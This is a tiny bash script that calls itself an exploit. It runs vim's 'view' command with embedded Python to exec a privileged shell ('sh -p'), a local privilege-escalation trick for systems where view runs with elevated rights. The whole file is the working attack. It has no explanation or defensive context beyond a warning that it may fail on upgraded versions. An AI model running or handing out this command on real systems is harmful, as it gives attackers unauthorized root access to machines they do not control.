#!/bin/bash

echo "This exploit may not work in upgraded verison."

view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

